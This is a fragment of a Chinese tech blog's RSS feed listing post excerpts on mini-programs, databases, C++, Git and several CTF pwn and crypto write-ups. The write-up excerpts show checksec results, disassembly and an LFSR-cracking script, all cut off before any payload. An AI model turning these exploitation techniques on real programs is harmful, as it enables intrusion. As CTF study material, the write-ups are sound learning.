尺寸单位 样式导入 尺寸单位 # rpx（responsive pixel）: 可以根据屏幕宽度进行自适应。规定屏幕宽为750rpx。如在 iPhone6 上，屏幕宽度为375px，共有750个物理像素，则750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像素。 设备 rpx换算px (屏幕宽度/750) px换算rpx (750/屏幕宽度) iPhone5 1rpx = 0.42px 1px = 2.34rpx iPhone6 1rpx = 0.5px 1px = 2rpx iPhone6 Plus 1rpx = 0.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/4.viewlayer/3.component/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/4.viewlayer/3.component/</guid><description>基础组件 # 框架为开发者提供了一系列基础组件，开发者可以通过组合这些基础组件进行快速开发。详细介绍请参考组件文档。
什么是组件：
组件是视图层的基本组成单元。 组件自带一些功能与微信风格一致的样式。 一个组件通常包括 开始标签 和 结束标签，属性 用来修饰这个组件，内容 在两个标签之内。 &amp;lt;tagname property=&amp;#34;value&amp;#34;&amp;gt;Content goes here ...&amp;lt;/tagname&amp;gt; 注意：所有组件与属性都是小写，以连字符-连接
属性类型 # 类型 描述 注解 Boolean 布尔值 组件写上该属性，不管是什么值都被当作 true；只有组件上没有该属性时，属性值才为false。 如果属性值为变量，变量的值会被转换为Boolean类型 Number 数字 1, 2.5 String 字符串 &amp;quot;string&amp;quot; Array 数组 [ 1, &amp;quot;string&amp;quot; ] Object 对象 { key: value } EventHandler 事件处理函数名 &amp;quot;handlerName&amp;quot; 是 Page 中定义的事件处理函数名 Any 任意属性 公共属性 # 所有组件都有以下属性：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/api%E8%AE%BE%E8%AE%A1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/api%E8%AE%BE%E8%AE%A1/</guid><description>API 设计 # RESTful # For TypeScript: https://github.com/thiagobustamante/typescript-rest
REST: Representational state transfer.
RESTful 是一种面向资源的过时 API 设计理念，他基于 http 协议，没有单独定义自己的一套协议，只是一种 API 设计范式。
它提供了四个指导原则：
Resource-Base 基于资源的：一个 uri 单独对应于一个资源； Manipulation Through Representations 动作表示：对资源的不同动作通过方法或参数表示； Self-Descriptive Message 自描述信息：每条请求都能没有上下文地无状态地，唯一执行一个动作； Hypermedia as the Engine of Application State (HATEOAS)：用高级的请求体来表示状态； GraphQL # For TypeScript: https://github.com/MichalLytek/type-graphql, https://typegraphql.com/
Official Website: https://graphql.org/
GraphQL: Graph Query Language.
介绍：GraphQL 是 Facebook 为了解决 RESTful 设计模式在系统庞大之后出现的各种问题应运而生的接口描述语言。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/cpp%E6%9D%82%E6%8A%80/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/cpp%E6%9D%82%E6%8A%80/</guid><description>cpp 杂技 # __builtin_expect：一个 if 分支极大可能不会执行，使用这个编译，附近的，编译器会将极大概率连续执行的代码编译为连续的二进制。
__attribute__ 相关（查看 GNU 官方文档 ）：
unused: 显式地指定一个变量不会被使用，-Wall 编译时不会抛出警告，比如：int main(int argc __attribute__((unused)), char **argv)；
format: 传递 printf 类似的参数时进行参数校验，比如：extern void printfBy(int flag, const char *format, ...) __attribute__((format(printf, 2, 3)));
noreturn: 显式地告诉编译器对应的函数不会调用 exit 或 abort 等函数；
如何定义一个只能分配在栈（堆）上的类（参考博客）：
将析构函数定义为私有函数，编译器无法在栈分配时调用析构方法。对象将只能被定义在堆上；
重载 new() 与 delete()，对象无法被动态分配。对象将只能被定义在栈上；
用纯 C 实现 C++ 类继承中的动态虚函数特性（参考博客），实现虚函数表。
定义结构体编译对齐方法，比如按四字节对齐：
#pragma pack(push) #pragma pack(4) .</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/cpp%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB%E6%A2%B3%E7%90%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/cpp%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB%E6%A2%B3%E7%90%86/</guid><description>复习地址:
https://github.com/huihut/interview C++ 知识结构系统梳理 # 关键字 # 零碎知识 # 面向对象 # 智能指针 # 智能指针定义在头文件 memory 中。
强制类型转换 # STL # Deque 的全称是 double ended queue，两端结束队列；
它是 stack 与 queque 的底层存储结构，它的实现基于 vector 的实现，它结构大致如下：
可以看到这样存储的优点是：
仍然可以通过接近与 O(1) 常数级别的时间复杂度进行访问； 在两端的插入删除复杂度仍然为 O(1)； 对于 stack 与 queue 这样的仅仅在双端有插入删除访问操作的数据结构，是一个合适的基类；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/2019de1ctf/babylfsr/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/2019de1ctf/babylfsr/</guid><description>baby lfsr # 在比赛的时候一直在想怎么用 berlekamp_massey 算法求解（用矩阵求解，写代码更快，512 比特没必要用 BM 算法），并且把判断条件抄成了 1124 &amp;hellip;.
脚本 # 破解 LFSR：指定一个比特序列，返回一个转移矩阵（实现方式详见 https://github.com/shesl-meow/shesl-crypto）。
最终的破解脚本：
#!/usr/bin/env python2 # coding=utf-8 import hashlib from sage.all import * from itertools import product from sheslcrypto.LFSR import CrackLfsr if __name__==&amp;#34;__main__&amp;#34;: with open(&amp;#34;output&amp;#34;, &amp;#34;r&amp;#34;) as f: raw = [int(b) for b in f.read().strip()] for num in product([0, 1], repeat=8): CL = CrackLfsr(raw + list(num), period=256) try: T = CL.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/2019de1ctf/babyrsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/2019de1ctf/babyrsa/</guid><description>baby rsa # 这题涉及了大量的 RSA 相关的破解知识。
题目 # 阅读题目之后实际上就是解数个方程，在没有 hint 的情况下，方程如下：
$$\begin{cases} p^4 \equiv C_{1} \pmod{N_{1}} \ p^4 \equiv C_{2} \pmod{N_{2}} \ p^4 \equiv C_{3} \pmod{N_{3}} \ p^4 \equiv C_{4} \pmod{N_{4}}\end{cases}$$
$$\begin{cases} (e_1)^{42} &amp;amp;\equiv C_{e1} \pmod{N_e} \ (e_2 + T)^3 &amp;amp;\equiv C_{e2} \pmod{N_e}\end{cases}$$
$$q_1 * x = N_q \text{ where } q_1 &amp;lt; x$$
$$\begin{cases} flag^{e_1} \equiv C_{f1} \pmod{p * q_1} \ flag^{e_2} \equiv C_{f2} \pmod{p * q_2}\end{cases}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/2019ogeek/bookmanager/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/2019ogeek/bookmanager/</guid><description>写在前面 # 第一次比赛一个堆溢出题目快要做出来了，却因为环境配置问题（一直无法用给定版本的 libc.so 运行程序）。最后不得不再源码编译 glibc-2.23（坑太多了，系统被搞崩了一次），心态爆炸。
指定版本的 libc 运行程序 # 总结一下到底应该如何使用一个给定的 glibc 库文件运行指定的可执行文件：
第一步则是需要拿到指定的 ld.so 文件（用于链接 libc.so 与可执行文件的程序），将目标文件的链接程序地址指向本地的 ld.so 文件。
这一步网上有 python 脚本，但是使用 patchelf 这个命令更快。
第二步是设置 LD_PRELOAD 环境变量。
比如说，这个程序需要运行 libc-2.23.so，我们就需要执行以下的两条命令：
$ patchelf --set-interpreter /usr/local/glibc-2.23/lib/ld-2.23.so bookmanager $ export LD_PRELOAD=/usr/local/glibc-2.23/lib/libc-2.23.so 如果我们已经将可执行文件中，链接程序的地址设置好了，我们也可以再 pwntools 中这么运行：
from pwn import * p = process([&amp;#34;./bookmanager&amp;#34;], env={&amp;#34;LD_PRELOAD&amp;#34;: &amp;#34;/usr/local/glibc-2.23/lib/libc-2.23.so&amp;#34;}) 编译指定版本的 libc # 但是上面我文件中的 ld.so 文件，题目是没有给的，于是我们就需要通过源码编译的方式得到这个文件。
网上应该会有直接的资源下载，但是我太菜了，没有找到，只找到了源码的国内镜像 如果没有遇到任何问题，下面几条命令应该是一个完整的编译流程：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/ctf-wiki/offbyone/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/ctf-wiki/offbyone/</guid><description>题目：Asis CTF 2016 b00ks
Off By One # 文件信息 # 首先检查保护等级：
$ checksec ./b00ks [*] &amp;#39;/mnt/d/program/ctf/ctf-wiki/offbyone/b00ks&amp;#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 程序没有开启栈保护。查看各个段的权限：
gdb-peda$ vmmap Warning: not running Start End Perm Name 0x00000808 0x0000135d rx-p /mnt/d/program/ctf/ctf-wiki/offbyone/b00ks 0x00000238 0x00001914 r--p /mnt/d/program/ctf/ctf-wiki/offbyone/b00ks 0x00201d58 0x00202100 rw-p /mnt/d/program/ctf/ctf-wiki/offbyone/b00ks 各个段的地址则可以通过以下的方式查看：
$ readelf --section-headers ./b00ks There are 27 section headers, starting at offset 0x2160: .</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/ctf-wiki/ret2libc3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/ctf-wiki/ret2libc3/</guid><description>ret2libc # 保护等级 # 首先检查保护等级：
$ checksec ret2libc3 [*] &amp;#39;/mnt/d/program/ctf/ctf-wiki/ret2libc3/ret2libc3&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看到这是一个开启了部分只读和栈溢出保护的程序。
程序逻辑 # 在 Ida Pro 中打开即可看到 main 函数的伪代码：
int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&amp;#34;No surprise anymore, system disappeard QQ.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/ctf-wiki/useafterfree/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/ctf-wiki/useafterfree/</guid><description>题目：Hitcon Training lab10
Use After Free # 文件信息 # 检查文件安全性：
$ checksec ./hacknote [*] &amp;#39;/mnt/d/program/ctf/ctf-wiki/useafterfree/hacknote&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 程序没有开启地址随机化，有栈保护和堆栈不可执行。
程序逻辑 # 这个可执行文件中存在函数的调式信息，main 函数就是打印菜单，然后执行几个选项的常规套路。
menu # int menu() { puts(&amp;#34;----------------------&amp;#34;); puts(&amp;#34; HackNote &amp;#34;); puts(&amp;#34;----------------------&amp;#34;); puts(&amp;#34; 1. Add note &amp;#34;); puts(&amp;#34; 2. Delete note &amp;#34;); puts(&amp;#34; 3.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/pwnable/1.start/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/pwnable/1.start/</guid><description>参考资料：
安全客，前六题的题解：https://www.anquanke.com/post/id/150359 Linux Syscall Reference：http://syscalls.kernelgrok.com/ Assembly Reference: https://www.felixcloutier.com/x86/ START # 首先检查安全保护等级：
$ checksec ./start [*] &amp;#39;/mnt/d/program/ctf/pwnable/start/start&amp;#39; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 查看汇编代码：
$ objdump -d ./start ./start: file format elf32-i386 Disassembly of section .text: 08048060 &amp;lt;_start&amp;gt;: 8048060: 54 push %esp 8048061: 68 9d 80 04 08 push $0x804809d 8048066: 31 c0 xor %eax,%eax 8048068: 31 db xor %ebx,%ebx 804806a: 31 c9 xor %ecx,%ecx 804806c: 31 d2 xor %edx,%edx 804806e: 68 43 54 46 3a push $0x3a465443 8048073: 68 74 68 65 20 push $0x20656874 8048078: 68 61 72 74 20 push $0x20747261 804807d: 68 73 20 73 74 push $0x74732073 8048082: 68 4c 65 74 27 push $0x2774654c 8048087: 89 e1 mov %esp,%ecx 8048089: b2 14 mov $0x14,%dl 804808b: b3 01 mov $0x1,%bl 804808d: b0 04 mov $0x4,%al 804808f: cd 80 int $0x80 8048091: 31 db xor %ebx,%ebx 8048093: b2 3c mov $0x3c,%dl 8048095: b0 03 mov $0x3,%al 8048097: cd 80 int $0x80 8048099: 83 c4 14 add $0x14,%esp 804809c: c3 ret 0804809d &amp;lt;_exit&amp;gt;: 804809d: 5c pop %esp 804809e: 31 c0 xor %eax,%eax 80480a0: 40 inc %eax 80480a1: cd 80 int $0x80 我们分析这个汇编代码的结构：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/pwnable/2.orw/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/pwnable/2.orw/</guid><description>参考资料：
https://www.anquanke.com/post/id/150359 ORW # 首先检查安全保护等级：
$ checksec orw [*] &amp;#39;/media/data/program/ctf/pwnable/orw/orw&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 可以看到这个程序开启了以下保护机制：
Canary 开启，部分 RELOAD，还有 RWX 读写执行段。 在 gdb 里面可以查看 main 函数的汇编代码：
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048330 _init
0x08048370 read@plt
0x08048380 printf@plt
0x08048390 __stack_chk_fail@plt
0x080483a0 __libc_start_main@plt
0x080483b0 prctl@plt
0x080483c0 __gmon_start__@plt
0x080483d0 _start
0x08048400 __x86.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/pwnable/3.calc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/pwnable/3.calc/</guid><description>CALC # 保护等级 # 首先检查安全保护等级：
$ checksec calc [*] &amp;#39;/media/data/program/ctf/pwnable/calc/calc&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 程序开启了 NX 保护，不能执行栈代码。我们再看程序的链接方式：
$ objdump -R calc calc： 文件格式 elf32-i386 objdump: calc：不是动态对象 objdump: calc: invalid operation 程序是静态链接。
程序逻辑 # main # 在 gdb 中我们可以看到这个程序的逻辑结构过于复杂，我们使用 Ida Pro 打开。首先看 main 函数，可以在 Ida Pro 中查看其伪代码：
int __cdecl main(int argc, const char **argv, const char **envp) { ssignal(14, timeout); alarm(60); puts(&amp;#34;=== Welcome to SECPROG calculator ===&amp;#34;); fflush(stdout); calc(); return puts(&amp;#34;Merry Christmas!</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/pwnable/4.3x17/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/pwnable/4.3x17/</guid><description>参考资料：
https://github.com/maroueneboubakri/lscan/wiki/Reverse-Engineer-a-stripped-binary-with-lscan-and-IDApro https://www.jianshu.com/p/7a1441e4f355 3x17 # 保护等级 # 首先检查程序的保护等级：
$ checksec 3x17 [*] &amp;#39;/media/data/program/ctf/pwnable/3x17/3x17&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 首先我们发现这是一个 64 位的程序，另外程序没有开启栈溢出的 canary 保护，但是堆栈不可执行。
我们再看程序的链接方式：
$ objdump -R 3x17 3x17： 文件格式 elf64-x86-64 objdump: 3x17：不是动态对象 objdump: 3x17: invalid operation 是一个静态链接的文件。看各个段的权限：
gdb-peda$ vmmap Start End Perm Name 0x00401000 0x0048e335 rx-p /root/ctf/pwnable/3x17/3x17 0x00400200 0x004b2a31 r--p /root/ctf/pwnable/3x17/3x17 0x004b40c0 0x004baa20 rw-p /root/ctf/pwnable/3x17/3x17 加载 sig 函数签名 # lscan.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ethereum%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ethereum%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</guid><description>概念 # KDF：彩虹表攻击
重入攻击
数字货币的双重支付问题
递归长度前缀 Recursive Length Prefix (RLP)
Merkle Patricia Tree
工作量证明算法（Ethash、Casper）、共识算法
ÐΞVp2p
智能合约；
外部账户（EOA）和合约账户；
代码、项目、实践 # 运行这些程序：Ethereum、web3js(Whisper)、Swarm、Solidity（IDE：Remix）、Parity、Go-Ethereum； 使用 MetaMask 体验以太坊； 尝试运行一个完整的以太坊客户端节点；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/git%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/git%E6%96%87%E4%BB%B6%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84/</guid><description>Git Advance # Git 文件系统 # 概述 # 我们在一个 git init 结果的空仓库中，简述一下各个部分的作用：
.git ├── HEAD // 指示当前被检出的分支 ├── branches // 废弃 ├── config // 项目内的配置文件 ├── description // 供GitWeb程序使用 ├── hooks // 存储钩子脚本 │ ├── applypatch-msg.sample │ ... ├── info // 目录包含一个全局性排除(global exclude)文件， │ └── exclude // 用以放置那些不希望被记录在 .gitignore 文件中的忽略模式(ignored patterns) ├── objects // 存储所有数据内容 │ ├── info // 仓库的额外信息 │ └── pack // 压缩后的包文件 └── refs // 存储指向分支的提交对象的指针 ├── heads // 分支 └── tags // 标签 执行以下命令可以查看 Git 目录结构说明：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/latexmanual/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/latexmanual/</guid><description>Latex Command # Command on Linux # 使用 latex 编译的命令（详细的帮助文档可以使用 --help 参数查看）：
$ latexmk --help 使用 MikTex 编译的命令（详细的帮助文档可以使用 --help 参数查看）：
$ telatex --help Latex 安装包目录管理命令（详细的帮助文档可以使用 --help 参数查看）：
$ kpsewhich --help 手动安装到一个安装目录之后，需要使用以下命令更新 LaTex 的安装包搜索路径：
$ sudo mktexlsr Command on mac OS X #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/linuxmanual/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/linuxmanual/</guid><description>Linux Manual # 通过 SSH 连接服务器 # 通过以下的命令通过 ssh 登陆服务器：
$ ssh -l &amp;lt;username&amp;gt; &amp;lt;ip&amp;gt; 服务器开放指定端口 # 安装
$ sudo apt-get install iptables 添加规则。比如以下命令打开 8000 端口：
$ iptables -A INPUT -p tcp --dport 8000 -j ACCEPT 删除此条添加的规则则使用下面的命令：
$ iptables -D INPUT -p tcp --dport 8000 -j ACCEPT 保存规则
$ iptables-save 持续化规则。安装 iptables-persistent 支持：
$ sudo apt-get install iptables-persistent 使用进行持续化规则：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/mongdb%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/mongdb%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</guid><description>原理介绍 # 参考资料：https://zhuanlan.zhihu.com/p/87722764
简介 # MongoDB 是最受欢迎的 NoSQL 数据库，文档数据库排名第一位，在所有数据库引擎中排名第五位（Oracle、MySQL、Microsoft-SQL-Server、Postgre SQL）。
了解 MongoDB 的发展历史可以查看 这篇文章。
特性 # 以下是 MongoDB 的一些特性：
面向文档存储，基于 JSON/BSON 可表示灵活的数据结构。因此与 javascript 有天生的兼容性，nodejs 服务则倾向于使用 mongodb 作为其底层数据结构；
动态 DDL 能力，没有强 Schema 约束，支持快速迭代。同样也于 javascript 脚本语言的变量无类型性吻合。
高性能计算，提供基于内存的快速数据查询；
容易扩展，利用数据分片可以支持海量数据存储；
丰富的功能集，支持二级索引、强大的聚合管道功能，为开发者量身定做的功能，如数据自动老化、固定集合等等。
跨平台版本、支持多语言SDK。
基本模型 # 基本概念与操作 # MongoDB 是最像关系型数据库的文档型数据库，为了实现关系型数据库的一些模型，MongoDB 自己定义了一些概念。
RDBMS 概念 MongoDB 概念 database database。与 RDB 相同，表示表的集合。 table collection：一个 collection 可以存放多个文档。 不同之处在于 collection 的 schema 是动态的，不需要预先声明一个严格的表结构。更重要的是，默认情况下 MongoDB 并不会对写入的数据做任何schema 的校验。 row document：相当于 RDB 中的“行”，一个文档由多个字段（列）组成，并采用bson 格式表示（下面阐述）。 column field：相当于 RDB 中的“列”，相比普通column的差别在于field的类型可以更加灵活，比如支持嵌套的文档、数组。 view view：在 MongoDB3.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/mysql%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/mysql%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</guid><description>性能优化 # 查询优化 # 查询语句使用原则：
范围查询的列放到索引列的最后面：MySQL 会一直向右利用索引匹配直到遇到范围查询（&amp;gt;、&amp;lt;、between、like）就停止匹配，所以如果将范围放在前面，后面的索引将无法使用。
PS：这里的范围查询是不包括 in 的，in 是指多个等值条件查询，不对联合索引的匹配造成影响。但是通过 explain 分析执行计划时无法区别范围查询和多个等值查询（统一显示为 range）
= 和 in 可以乱序：MySQL 的查询优化器会帮你优化成索引可以识别的形式。根据经验是将业务中使用到的查询里最常用的列放在前面，这样可以尽量使用到该索引。
字符串通配符尽量后置：Like 查询如果使用 %s% 这种格式，非最左前缀匹配将无法使用到索引。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/sagemath%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/sagemath%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</guid><description>SageMath 快速使用手册 # 基于 python2 的数学教学工具 sage-math。
Quick Manual:
比特流转换为整数：
ZZ([1,1,0,1],base=2) 这种方式与 int('1101',2) 转换的结果相反，它等价于 int('1011', 2)
整数转化为比特流：
Integer(15).binary() 在 sage 中，通过多项式建立一个有限域：
sage: FF = GF(2**8, name=&amp;#39;x&amp;#39;, modulus=x^8 + x^4 + x^3 + x + 1) 在这个有限域中，整数与多项式相互转化：
# 整数转化为多项式 sage: FF.fetch_int(5) x^2 + 1 # 多项式转化为整数 sage: FF(x^2 + 1).integer_representation() 5</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/svntutorial/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/svntutorial/</guid><description>学习网址：
https://www.tutorialspoint.com/svn/svn_environment.htm SVN # SVN is a Version Control System.
Life Cycle # Create Repository: create operation is used to create a new repository. Checkout: Checkout operation is used to create a working copy from the repository. Update: update operation is used to update working copy. Perform Changes: Rename operation changes the name of the file/directory. Move operation is used to move files/directories from one place to another in a repository tree.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/tsdb%E5%AD%A6%E4%B9%A0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/tsdb%E5%AD%A6%E4%B9%A0/</guid><description>TSDB 学习 # 时序数据的特点：
数据按照时间严格单调排序； Append Only：只能向后插入数据，不能更新； 写数量远大于读数量：大于 90% 的数据从未被读取； 数据量级特别大，但是相对比较稳定； 随着时间的推移，数据的价值减小，最近数据的价值高于历史数据； 通常与 tag 聚合在一起，根据时间范围进行查询； Metrics 是字节跳动实现 tsdb 的解决方案，很多平台的数据源都来自 Metrics：
alarm、grafana、metro-fe、argos； Metrics 系统架构分为三级：
SDK 侧：通过 SDK 将日志信息发送到 agent，agent 通过 producer 发送到消息队列中； 核心逻辑：consimer/preshuffle 两个消费逻辑链路，分别将数据存储到冷热存储的两个不同数据库中； 数据存储：速度快的“热存储”TSDC、速度较慢的“冷存储”mstore； Open Source：
在业界有很多开源的解决方案：Influxdb、Opentsdb、Druid、Elasticsearch、Beringei 等；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E7%AE%97%E6%B3%95%E5%B0%8F%E8%AE%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E7%AE%97%E6%B3%95%E5%B0%8F%E8%AE%B0/</guid><description>一些常见的算法小记 # Fisher–Yates shuffle 洗牌算法：https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle
Boyer-Moore 多数投票算法：https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_majority_vote_algorithm
